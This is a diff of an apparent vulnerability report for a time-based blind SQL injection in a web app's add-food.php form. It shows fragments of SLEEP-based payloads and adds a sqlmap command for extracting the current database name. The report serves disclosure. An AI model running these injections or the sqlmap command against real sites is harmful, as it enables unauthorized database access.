@@ -9,7 +9,7 @@ Vulnerability File: /youthappam/add-food.php
 
 Vulnerability location: /youthappam/add-food.php POST form exists time-based blind injection vulnerability
 
-Payload1: 
+## Payload1: 
 
 ```
 ------WebKitFormBoundarywm9jYBqgKtHi9E5z
@@ -44,7 +44,7 @@ SELECT(SLEEP(5)) The server response time is 5 seconds
 
 ![image](pic/1.png)
 
-Payload2: 
+## Payload2: 
 
 ```
 ------WebKitFormBoundarywm9jYBqgKtHi9E5z
@@ -79,7 +79,7 @@ SELECT(SLEEP(10)) The server response time is 10 seconds
 
 ![image](pic/2.png)
 
-Payload3: 
+## Payload3: 
 
 ```
 ------WebKitFormBoundarywm9jYBqgKtHi9E5z
@@ -113,4 +113,16 @@ Content-Disposition: form-data; name="create"
 SELECT(SLEEP(15)) The server response time is 15 seconds
 
 ![image](pic/3.png)
+
+## Payload4: 
+
+Store the post message in a file, and further disclose the database information through sqlmap.
+
+![image](pic/4.png)
+
+sqlmap cmd: ```python .\sqlmap.py -r .\header.txt --tamper=space2comment --risk 3 -current-db```
+
+results:
+
+![image](pic/5.png)
 
